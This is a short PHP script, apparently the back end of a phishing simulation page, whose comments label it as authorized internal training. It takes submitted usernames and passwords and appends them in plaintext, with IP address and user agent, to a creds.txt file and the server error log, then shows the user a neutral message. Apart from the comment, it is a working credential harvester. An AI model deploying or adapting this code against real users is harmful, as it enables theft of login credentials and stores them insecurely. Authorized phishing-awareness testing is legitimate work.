<?php
// Training simulation - capture.php
// For authorized internal testing only

header('Content-Type: text/plain; charset=utf-8');

// Get POST data
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Get additional info
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Create log entry
$logEntry = "[$timestamp] IP: $ip | UA: $userAgent | Username: $username | Password: $password\n";

// Append to creds.txt
file_put_contents('creds.txt', $logEntry, FILE_APPEND | LOCK_EX);

// Optional: Log to console for debugging
error_log("Training capture: $logEntry");

// Return success message (hidden from user)
echo "Training simulation complete.";
?>
